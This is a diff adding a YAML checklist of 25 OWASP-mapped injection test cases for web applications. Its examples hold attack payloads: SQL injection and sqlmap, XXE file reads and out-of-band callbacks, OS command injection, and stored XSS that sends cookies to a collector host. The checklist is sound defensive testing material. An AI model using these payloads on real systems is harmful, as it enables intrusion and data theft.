@@ -1,0 +1,781 @@
+- id: WEB-INJ-001
+  sheet: WEB
+  category: INJ
+  title: Test for SQL injection in database queries
+  objective: Finds inputs where user data changes the structure of a SQL query.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - List every input that can reach a database query, including hidden fields, headers and cookies.
+  - Send a single quote and a semicolon in each input and compare the responses.
+  - Send a true clause and a false clause, for example 1=1 and 1=2, and compare the responses.
+  - Send a time delay payload and measure the response time.
+  - Run sqlmap against the confirmed input to find the database type and the level of access.
+  example: 'Burp Repeater payloads: 1'' OR ''1''=''1 ; 1'' AND ''1''=''2 ; 1 AND IF(version() like ''5%'',sleep(5),''false'')-- ; sqlmap -u "https://target/product.php?id=1" --technique=BEUST --risk=3'
+  expected: Only parameterized queries, ORM calls, or an allowlisted structure reach the database. No SQL error or timing difference exposes injection.
+  severity: Critical
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    owasp_top10:
+    - A05:2025
+    wstg:
+    - WSTG-INJT-05
+    asvs:
+    - V1.2.4
+    cheatsheet:
+    - SQL_Injection_Prevention_Cheat_Sheet
+    - Query_Parameterization_Cheat_Sheet
+    cwe:
+    - CWE-89
+    capec:
+    - CAPEC-66
+    - CAPEC-7
+    - CAPEC-108
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/05-SQL_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md
+  - sources/repos/CheatSheetSeries/cheatsheets/Query_Parameterization_Cheat_Sheet.md
+  - sources/repos/Top10/2025/docs/en/A05_2025-Injection.md
+- id: WEB-INJ-002
+  sheet: WEB
+  category: INJ
+  title: Test SQL injection against each supported database backend
+  objective: Confirms the database-specific fingerprint and injection syntax match what the server runs.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Fingerprint the backend from error text, comment syntax and version functions.
+  - Use the UNION technique to find the column count with an ORDER BY payload.
+  - Extract the database version with a UNION SELECT of the version function.
+  - Repeat the fingerprint and extraction steps for Oracle, MySQL, SQL Server, PostgreSQL and MS Access syntax.
+  example: https://target/product.php?id=10 ORDER BY 10-- ; https://target/product.php?id=10 UNION SELECT 1,@@version-- (MSSQL); UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1-- (PostgreSQL); 1 AND
+    1=0 UNION SELECT @@version/* (MySQL)
+  expected: The application returns the same generic error for every backend and never discloses database version or structure.
+  severity: High
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-INJT-05
+    cheatsheet:
+    - SQL_Injection_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-89
+    capec:
+    - CAPEC-66
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/05-SQL_Injection.md
+  - sources/repos/CheatSheetSeries/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md
+- id: WEB-INJ-003
+  sheet: WEB
+  category: INJ
+  title: Test NoSQL query operators for injection
+  objective: Finds unsafe handling of JSON or operator-based query input in NoSQL databases.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find endpoints that pass JSON bodies into a NoSQL query, such as MongoDB find or aggregate.
+  - 'Replace a string value with an operator object, for example {"$ne": null} or {"$gt": ""}.'
+  - Send special characters '"\;{} in a single text field and compare the responses.
+  - If a $where clause exists, inject JavaScript and measure execution with a delay.
+  example: 'POST body: {"username": {"$ne": null}, "password": {"$ne": null}} ; $where injection: 0;var date=new Date();do{curDate=new Date();}while(curDate-date<10000)'
+  expected: The application rejects operator objects in place of scalar values and does not evaluate attacker JavaScript.
+  severity: Critical
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-INJT-05
+    cheatsheet:
+    - NoSQL_Security_Cheat_Sheet
+    - SQL_Injection_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-943
+    capec:
+    - CAPEC-676
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/05-SQL_Injection.md
+  - sources/repos/CheatSheetSeries/cheatsheets/NoSQL_Security_Cheat_Sheet.md
+  - sources/repos/CheatSheetSeries/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md
+- id: WEB-INJ-004
+  sheet: WEB
+  category: INJ
+  title: Test ORM and query-builder calls for injection
+  objective: Finds ORM code that concatenates input instead of using bound parameters.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Identify the ORM in use from error messages, headers or source code.
+  - Send a single quote in a field that reaches an ORM query and look for an ORM-specific error.
+  - For Hibernate, send an HQL payload that always evaluates true.
+  - Review source code for createQuery or createSQLQuery calls built by string concatenation.
+  example: 'HQL: '' OR ''1'' = ''1'' -- ; Laravel example payload from advisory: whereRaw with unescaped input; review code for session.createQuery("from Orders where id=" + id)'
+  expected: All ORM queries use bound parameters or the query builder, never string concatenation of user input.
+  severity: High
+  test_type: Code Review
+  refs:
+    wstg:
+    - WSTG-INJT-05
+    cheatsheet:
+    - SQL_Injection_Prevention_Cheat_Sheet
+    - Query_Parameterization_Cheat_Sheet
+    cwe:
+    - CWE-564
+    - CWE-89
+    capec:
+    - CAPEC-109
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/05-SQL_Injection.md
+  - sources/repos/CheatSheetSeries/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md
+  - sources/repos/CheatSheetSeries/cheatsheets/Query_Parameterization_Cheat_Sheet.md
+- id: WEB-INJ-005
+  sheet: WEB
+  category: INJ
+  title: Test SQL injection inside stored procedures and functions
+  objective: Finds stored procedures that build dynamic SQL from parameters with EXECUTE IMMEDIATE or exec.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Identify calls to stored procedures from the application traffic.
+  - Send injection payloads in each procedure parameter.
+  - Check if the procedure calls EXECUTE IMMEDIATE, exec, or sp_executesql with concatenated input.
+  - Review the procedure source if code access is available.
+  example: 'SQL Server: exec master.dbo.xp_cmdshell ''whoami''-- ; a procedure parameter of 1'' OR 1=1--'
+  expected: Stored procedures use bind variables for every parameter and never concatenate input into dynamic SQL.
+  severity: Critical
+  test_type: Manual
+  refs:
+    owasp_top10:
+    - A05:2025
+    wstg:
+    - WSTG-INJT-05
+    cheatsheet:
+    - SQL_Injection_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-89
+    capec:
+    - CAPEC-108
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/05-SQL_Injection.md
+  - sources/repos/CheatSheetSeries/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md
+  - sources/repos/Top10/2025/docs/en/A05_2025-Injection.md
+- id: WEB-INJ-006
+  sheet: WEB
+  category: INJ
+  title: Test LDAP search filters and login for injection
+  objective: Finds LDAP filters built by concatenating user input into the filter string.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find inputs used to build an LDAP search filter, such as a username or search box.
+  - Send a wildcard character and LDAP metacharacters and compare the responses.
+  - Try an authentication bypass with a filter-closing payload in the username and password fields.
+  example: 'Search: user=* ; Login bypass: user=*)(uid=*))(|(uid=* , pass=password'
+  expected: The application escapes LDAP metacharacters in every filter and rejects an always-true filter.
+  severity: Critical
+  test_type: Manual
+  level: ASVS L2
+  refs:
+    owasp_top10:
+    - A05:2025
+    wstg:
+    - WSTG-INJT-06
+    asvs:
+    - V1.2.6
+    cheatsheet:
+    - LDAP_Injection_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-90
+    capec:
+    - CAPEC-136
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/06-LDAP_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.md
+  - sources/repos/Top10/2025/docs/en/A05_2025-Injection.md
+- id: WEB-INJ-007
+  sheet: WEB
+  category: INJ
+  title: Test XML input for XML injection and malformed structure attacks
+  objective: Finds XML parsers that fail to neutralize metacharacters supplied in element values.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find an endpoint or form that accepts data later placed into an XML document.
+  - Submit single and double quotes inside an XML attribute value.
+  - Submit angle brackets, a CDATA closing sequence and an unescaped ampersand inside an element value.
+  - Check if the resulting document is malformed or if content is misplaced.
+  example: 'Username = foo'' ; Username = foo<!-- ; CDATA breakout: ]]> ; unescaped ampersand: Username = &foo'
+  expected: The application escapes or rejects XML metacharacters and the document structure cannot be changed by input.
+  severity: Medium
+  test_type: Manual
+  level: ASVS L2
+  refs:
+    wstg:
+    - WSTG-INJT-07
+    asvs:
+    - V1.1.2
+    cwe:
+    - CWE-91
+    capec:
+    - CAPEC-250
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/07-XML_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+- id: WEB-INJ-008
+  sheet: WEB
+  category: INJ
+  title: Test XML parser configuration for XXE and billion-laughs attacks
+  objective: Finds XML parsers that resolve external entities or expand nested entities without limits.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Submit an XML document with a DOCTYPE that defines an external entity pointing to a local file.
+  - Observe whether the response discloses the file content.
+  - If no direct output exists, use an out-of-band DOCTYPE pointing to a collector host and watch for a callback.
+  - Submit a nested entity expansion payload and monitor server memory and CPU.
+  example: '<!DOCTYPE user [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><user>&xxe;</user> ; OOB: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collaborator-host/collect">%xxe;]> ; billion laughs nested
+    <!ENTITY> chain'
+  expected: The parser disables DOCTYPE declarations and external entity resolution and limits entity expansion.
+  severity: Critical
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    wstg:
+    - WSTG-INJT-07
+    asvs:
+    - V1.5.1
+    cheatsheet:
+    - XML_External_Entity_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-611
+    - CWE-776
+    capec:
+    - CAPEC-228
+    - CAPEC-197
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/07-XML_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md
+- id: WEB-INJ-009
+  sheet: WEB
+  category: INJ
+  title: Test server-side includes for SSI injection
+  objective: Finds pages that interpret user input as a server-side include directive.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Determine whether the web server supports SSI, for example .shtml pages.
+  - Find inputs including headers and cookies that are reflected into SSI-processed pages.
+  - Submit an echo directive to read a server variable.
+  - Submit an exec directive to request operating system command output.
+  example: 'Referer: <!--#exec cmd="/bin/ps ax"--> ; <!--#echo var="DOCUMENT_NAME" -->'
+  expected: SSI directives in user input are neutralized and the exec directive is disabled on the server.
+  severity: Critical
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-INJT-08
+    cwe:
+    - CWE-97
+    capec:
+    - CAPEC-101
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/08-SSI_Injection.md
+- id: WEB-INJ-010
+  sheet: WEB
+  category: INJ
+  title: Test XPath queries for injection and authentication bypass
+  objective: Finds XPath queries built by concatenating untrusted login or search input.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find an input placed into an XPath expression, such as a login form backed by an XML store.
+  - Submit an always-true boolean payload in the username and password fields.
+  - Observe whether the application authenticates or returns data without valid credentials.
+  example: 'Username: '' or ''1'' = ''1 ; Password: '' or ''1'' = ''1'
+  expected: The application binds values to the XPath query instead of concatenating them and rejects the always-true payload.
+  severity: Critical
+  test_type: Manual
+  level: ASVS L2
+  refs:
+    owasp_top10:
+    - A05:2025
+    wstg:
+    - WSTG-INJT-09
+    asvs:
+    - V1.2.7
+    cheatsheet:
+    - XPath_Injection_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-643
+    capec: []
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/09-XPath_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/XPath_Injection_Prevention_Cheat_Sheet.md
+  - sources/repos/Top10/2025/docs/en/A05_2025-Injection.md
+- id: WEB-INJ-011
+  sheet: WEB
+  category: INJ
+  title: Test webmail parameters for IMAP or SMTP command injection
+  objective: Finds webmail front ends that pass unescaped input into IMAP or SMTP commands.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Identify parameters used to build IMAP or SMTP commands, such as mailbox or message ID.
+  - Submit a double quote and other special characters in the parameter.
+  - Submit a CRLF sequence followed by a second command to test command injection.
+  example: https://webmail/src/view_header.php?mailbox=INBOX%22&passed_id=1 ; message_id=1 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0a
+  expected: IMAP and SMTP special characters and CRLF sequences are rejected or escaped before use in a mail command.
+  severity: High
+  test_type: Manual
+  level: ASVS L2
+  refs:
+    wstg:
+    - WSTG-INJT-10
+    asvs:
+    - V1.3.11
+    cwe:
+    - CWE-93
+    capec:
+    - CAPEC-41
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/10-IMAP_SMTP_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+- id: WEB-INJ-012
+  sheet: WEB
+  category: INJ
+  title: Test for code injection through dynamic code evaluation
+  objective: Finds features that execute user-supplied code through eval or an include statement.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find inputs that are used in an include, require, eval or similar execution construct.
+  - Submit a benign code snippet and check for its effect in the response.
+  - If execution is confirmed, submit a safe command to show code execution.
+  example: 'ASP code injection input: Request("Data") written to data.txt then Server.Execute("data.txt"); PHP eval probe: 7*7 to confirm execution, then a benign system command'
+  expected: User input never reaches eval, include or an equivalent dynamic execution function.
+  severity: Critical
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    owasp_top10:
+    - A05:2025
+    wstg:
+    - WSTG-INJT-11
+    asvs:
+    - V1.3.2
+    cwe:
+    - CWE-94
+    - CWE-95
+    capec:
+    - CAPEC-242
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/11-Code_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/Top10/2025/docs/en/A05_2025-Injection.md
+- id: WEB-INJ-013
+  sheet: WEB
+  category: INJ
+  title: Test file inclusion parameters for local and remote file inclusion
+  objective: Finds include or require calls that build a path from user input without validation.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find a parameter that selects a file to include or preview.
+  - Submit a path traversal sequence to read a local file outside the intended directory.
+  - Append a null byte or known truncation technique if an extension is appended server-side.
+  - If outbound connections are allowed, submit a URL to test remote file inclusion.
+  - Test PHP wrapper payloads such as php://filter and data:// if the backend is PHP.
+  example: https://target/preview.php?file=../../../../etc/passwd ; php://filter/convert.base64-encode/resource=config.php ; https://target/vuln.php?file=https://attacker/malicious
+  expected: File and URL parameters are resolved against an allowlist of safe paths with no path traversal or remote URL.
+  severity: Critical
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    wstg:
+    - WSTG-INJT-11
+    asvs:
+    - V5.3.2
+    cheatsheet:
+    - File_Upload_Cheat_Sheet
+    cwe:
+    - CWE-98
+    - CWE-73
+    - CWE-22
+    capec:
+    - CAPEC-193
+    - CAPEC-126
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/11-Code_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/File_Upload_Cheat_Sheet.md
+  see:
+  - WEB-AUTHZ-015
+- id: WEB-INJ-014
+  sheet: WEB
+  category: INJ
+  title: Test operating system command injection in server functions
+  objective: Finds application features that pass untrusted input into an OS command without sanitization.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find features that call the operating system, such as file conversion, ping or diagnostic tools.
+  - Append a command separator and a benign command to the input.
+  - Try alternative separators and command substitution if the first payload is filtered.
+  - If no output is returned, use an out-of-band callback to show blind execution.
+  example: 'Doc=Doc1.pdf | Dir c:\ ; input|/bin/ls ; ;cat /etc/passwd ; $(whoami) ; `whoami` ; OOB: ; curl http://collaborator-host'
+  expected: The application avoids calling OS commands with user input, or uses parameterized execution APIs with an allowlist of commands and arguments.
+  severity: Critical
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    owasp_top10:
+    - A05:2025
+    wstg:
+    - WSTG-INJT-12
+    asvs:
+    - V1.2.5
+    cheatsheet:
+    - OS_Command_Injection_Defense_Cheat_Sheet
+    cwe:
+    - CWE-77
+    - CWE-78
+    capec:
+    - CAPEC-88
+    - CAPEC-6
+    - CAPEC-15
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/12-Command_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.md
+  - sources/repos/Top10/2025/docs/en/A05_2025-Injection.md
+- id: WEB-INJ-015
+  sheet: WEB
+  category: INJ
+  title: Test string formatting functions for format string injection
+  objective: Finds code that passes user input directly as the format argument of a printf-family function.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find inputs that may reach a format function, for example logging of a username.
+  - Submit conversion specifiers such as %s and %n in the input.
+  - Observe for an application error, crash, or information disclosure in the response.
+  example: https://target/userinfo?username=%25s%25s%25s%25n
+  expected: User input is never passed as the format argument of a format function; it is passed only as a data argument.
+  severity: High
+  test_type: Manual
+  level: ASVS L2
+  refs:
+    wstg:
+    - WSTG-INJT-13
+    asvs:
+    - V1.3.10
+    cwe:
+    - CWE-134
+    capec:
+    - CAPEC-135
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/13-Buffer_Overflow.md
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/13-Format_String_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+- id: WEB-INJ-016
+  sheet: WEB
+  category: INJ
+  title: Test for incubated vulnerabilities that need a recall step
+  objective: Finds stored injection that only triggers when a later action recalls the planted data.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Identify features that store attacker data for later use, such as uploads, forum posts or report generation.
+  - Plant a stored XSS or SQL payload that fires on a later recall, such as an admin viewing a report.
+  - Trigger or wait for the recall step and confirm the planted payload executes.
+  example: 'Bulletin post: <script>document.write(''<img src="https://collaborator-host/cv.jpg?''+document.cookie+''">'')</script> then wait for an admin to view the post'
+  expected: Stored input is sanitized at write time and encoded at every later recall point, so the planted payload never executes.
+  severity: High
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-INJT-14
+    cwe:
+    - CWE-79
+    capec:
+    - CAPEC-592
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/14-Incubated_Vulnerability.md
+- id: WEB-INJ-017
+  sheet: WEB
+  category: INJ
+  title: Test reflected response headers for HTTP response splitting
+  objective: Finds user input reflected into a response header without CRLF filtering.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find a parameter reflected into a Location or Set-Cookie header, often through a redirect.
+  - Submit a CRLF sequence followed by a forged header and body in the parameter.
+  - Check if the response is split into two messages by an intermediary cache or browser.
+  example: interface=advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>injected</html>
+  expected: CR and LF characters are stripped or rejected before user input is placed into any response header.
+  severity: High
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-INJT-15
+    cwe:
+    - CWE-93
+    - CWE-113
+    capec:
+    - CAPEC-34
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/15-HTTP_Response_Splitting.md
+- id: WEB-INJ-018
+  sheet: WEB
+  category: INJ
+  title: Test front-end and back-end servers for HTTP request smuggling
+  objective: Finds parsing mismatches between Content-Length and Transfer-Encoding across proxy layers.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Send a CL.TE probe request with conflicting Content-Length and chunked Transfer-Encoding.
+  - Send a TE.CL probe request with the chunk size mismatched to the Content-Length.
+  - Send an obfuscated Transfer-Encoding header to test TE.TE desynchronization.
+  - Observe whether a following legitimate request is corrupted or routed unexpectedly.
+  example: 'CL.TE: Content-Length: 35\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nFoo: x ; Burp Suite HTTP Request Smuggler extension'
+  expected: The front-end and back-end agree on request boundaries and no smuggled request is ever processed.
+  severity: Critical
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-INJT-16
+    cwe:
+    - CWE-444
+    capec:
+    - CAPEC-33
+    - CAPEC-105
+    - CAPEC-273
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/16-HTTP_Request_Smuggling.md
+  see:
+  - WEB-HTTP-004
+- id: WEB-INJ-019
+  sheet: WEB
+  category: INJ
+  title: Test Host header handling for injection and cache poisoning
+  objective: Finds server logic that trusts the Host or X-Forwarded-Host header for routing or link generation.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Send a request with the Host header set to an attacker domain and observe the response.
+  - If filtered, retry using the X-Forwarded-Host header.
+  - Trigger password reset functionality with a tampered Host header and check the link in the email.
+  - Send a poisoned Host header to a cacheable page and request the same page again from another session.
+  example: 'Host: www.attacker.com ; X-Forwarded-Host: www.attacker.com ; password reset request with Host: www.attacker.com'
+  expected: The server uses a fixed, server-side configured hostname and ignores the Host header value for links and cache keys.
+  severity: High
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    wstg:
+    - WSTG-INJT-17
+    asvs:
+    - V3.4.2
+    cwe:
+    - CWE-20
+    capec:
+    - CAPEC-141
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/17-Host_Header_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+- id: WEB-INJ-020
+  sheet: WEB
+  category: INJ
+  title: Test template rendering for server-side template injection
+  objective: Finds templating engines that evaluate expressions built from untrusted input.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find inputs rendered through a template engine, such as a greeting or report field.
+  - Submit a generic arithmetic probe such as {{7*7}} and check if it is evaluated.
+  - Identify the template engine from the response and research its built-in functions.
+  - Build a proof-of-concept remote code execution payload for the identified engine.
+  example: 'Probe: a{{7*7}}b or ${7*7} or <%= 7*7 %> ; Flask/Jinja2: curl -g ''https://target/page?name={{7*7}}'' returns Hello 49'
+  expected: Untrusted input is never concatenated into template source; it is passed only as template data with escaping enabled.
+  severity: Critical
+  test_type: Manual
+  level: ASVS L2
+  refs:
+    owasp_top10:
+    - A05:2025
+    wstg:
+    - WSTG-INJT-18
+    asvs:
+    - V1.3.7
+    cheatsheet:
+    - Server_Side_Template_Injection_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-1336
+    - CWE-94
+    capec:
+    - CAPEC-242
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/18-Server-side_Template_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.md
+  - sources/repos/Top10/2025/docs/en/A05_2025-Injection.md
+- id: WEB-INJ-021
+  sheet: WEB
+  category: INJ
+  title: Test server-initiated requests for SSRF
+  objective: Finds server functions that fetch a URL supplied by the client without restriction.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find a feature that fetches a URL on the server, such as a webhook, PDF generator or import tool.
+  - Submit a URL pointing to the loopback address or an internal hostname.
+  - Submit alternative IP encodings if plain loopback addresses are blocked.
+  - Submit a file:// URL to test for local file disclosure.
+  example: http://127.0.0.1/admin ; http://2130706433/ ; http://017700000001/ ; http://127.0.0.2/ ; file:///etc/passwd ; iframe src=file:///etc/passwd in PDF generator input
+  expected: Outbound requests are restricted to an allowlist of domains, ports and protocols and loopback and link-local addresses are blocked.
+  severity: Critical
+  test_type: Manual
+  level: ASVS L2
+  refs:
+    owasp_top10:
+    - A05:2025
+    wstg:
+    - WSTG-INJT-19
+    asvs:
+    - V1.3.6
+    cheatsheet:
+    - Server_Side_Request_Forgery_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-918
+    capec:
+    - CAPEC-664
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/19-Server-Side_Request_Forgery.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md
+  - sources/repos/Top10/2025/docs/en/A05_2025-Injection.md
+- id: WEB-INJ-022
+  sheet: WEB
+  category: INJ
+  title: Test object binding endpoints for mass assignment
+  objective: Finds auto-binding frameworks that let a client set fields never exposed in the form.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Identify endpoints that create or update an object from submitted parameters.
+  - Retrieve the full object representation to learn hidden or sensitive field names.
+  - Add a sensitive field such as isAdmin or role to the create or update request.
+  - Observe whether the sensitive field value is accepted and persisted.
+  example: POST /createUser username=bob&password=x&email=bob@test&isAdmin=true ; probe field user[nonexistingattribute] for autobinding behavior
+  expected: The backend binds only an explicit allowlist of fields; extra client-supplied fields are ignored.
+  severity: High
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-INJT-20
+    cheatsheet:
+    - Mass_Assignment_Cheat_Sheet
+    cwe:
+    - CWE-915
+    capec: []
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/20-Mass_Assignment.md
+  - sources/repos/CheatSheetSeries/cheatsheets/Mass_Assignment_Cheat_Sheet.md
+  see:
+  - WEB-AUTHZ-007
+- id: WEB-INJ-023
+  sheet: WEB
+  category: INJ
+  title: Test spreadsheet export for CSV and formula injection
+  objective: Finds exported CSV files where a cell beginning with a formula character is evaluated by spreadsheet software.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Identify export features that place untrusted input into CSV, such as reports or audit logs.
+  - Enter a value beginning with =, +, -, @, tab or carriage return in an exportable field.
+  - Export the file and open it in Excel and in LibreOffice.
+  - Save and reopen the file in Excel to check the mitigation survives a round trip.
+  example: =1+1 ; +1+1 ; @SUM(1,1) ; =HYPERLINK("http://example.invalid/leak?test=1","Click Me") ; separator breakout then =1+1
+  expected: No exported cell is interpreted as a formula in Excel or LibreOffice, including after an Excel save and reopen.
+  severity: Medium
+  test_type: Manual
+  level: ASVS L3
+  refs:
+    wstg:
+    - WSTG-INJT-21
+    asvs:
+    - V1.2.10
+    cwe:
+    - CWE-1236
+    capec: []
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/21-CSV_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+- id: WEB-INJ-024
+  sheet: WEB
+  category: INJ
+  title: Test JSON-accepting endpoints for prototype pollution
+  objective: Finds recursive merge or clone code that lets attacker keys modify Object.prototype.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find JSON endpoints that merge, clone or extend a user-supplied object into application state.
+  - Submit a body containing a __proto__ or constructor.prototype key with a marker value.
+  - For client-side code, submit the marker through the URL hash or query string.
+  - Check whether the marker value is now present on a brand-new object.
+  example: '{"name":"test","__proto__":{"polluted":"yes"}} ; URL probe: https://target/#__proto__[testpolluted]=reflected ; then evaluate ({}).testpolluted in the console'
+  expected: Merge and clone functions reject or strip __proto__, constructor and prototype keys before assignment.
+  severity: High
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-INJT-22
+    cheatsheet:
+    - Prototype_Pollution_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-1321
+    capec: []
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/22-Prototype_Pollution.md
+  - sources/repos/CheatSheetSeries/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.md
+- id: WEB-INJ-025
+  sheet: WEB
+  category: INJ
+  title: Test cookies and API inputs for insecure deserialization
+  objective: Finds entry points that deserialize untrusted Java, PHP, Python pickle, Node or .NET serialized objects.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Inspect cookies, hidden fields and API bodies for serialization markers such as rO0, O:4:, or a .NET binary header.
+  - Identify the serialization format and library version in use.
+  - Submit a non-destructive out-of-band probe, such as ysoserial URLDNS, to confirm deserialization.
+  - If a type-metadata field such as @class or @type is accepted, flag it as high priority.
+  example: Cookie rememberMe=rO0ABXNy... ; java -jar ysoserial.jar URLDNS http://collaborator-host/ ; JSON probe {"@class":"com.example.Exploit"}
+  expected: The application never deserializes untrusted data, or restricts it to an allowlist of safe types with integrity checking.
+  severity: Critical
+  test_type: Manual
+  level: ASVS L2
+  refs:
+    owasp_top10:
+    - A05:2025
+    wstg:
+    - WSTG-INJT-23
+    asvs:
+    - V1.5.2
+    cheatsheet:
+    - Deserialization_Cheat_Sheet
+    cwe:
+    - CWE-502
+    capec:
+    - CAPEC-586
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/23-Insecure_Deserialization.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
